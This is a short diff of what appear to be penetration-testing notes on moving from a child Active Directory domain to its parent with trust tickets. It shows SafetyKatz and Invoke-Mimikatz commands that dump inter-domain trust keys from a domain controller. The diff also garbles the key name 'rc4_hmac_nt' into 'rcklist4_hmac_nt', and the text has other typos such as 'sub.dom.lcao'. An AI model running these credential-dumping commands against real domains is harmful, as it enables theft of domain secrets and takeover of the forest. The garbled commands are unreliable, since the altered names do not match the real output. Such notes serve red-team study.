@@ -23,9 +23,10 @@ Child to Parent using Trust Tickets
 <pre class="language-powershell"><code class="lang-powershell">SafetyKatz on DC
 lsadump ::trust /patch'
 
+Output:
 <strong>Domain: dom.local (dom/ S-1-5-2...) 
 </strong>[ In ] sub.dom.lcao -> dom.local
- => Take rc4_hmac_nt  ....
+ => Take rcklist4_hmac_nt  ....
 
 Invoke-Mimikatz -Command '"lsadump ::trust /patch'" -ComputerName dchostname
 or
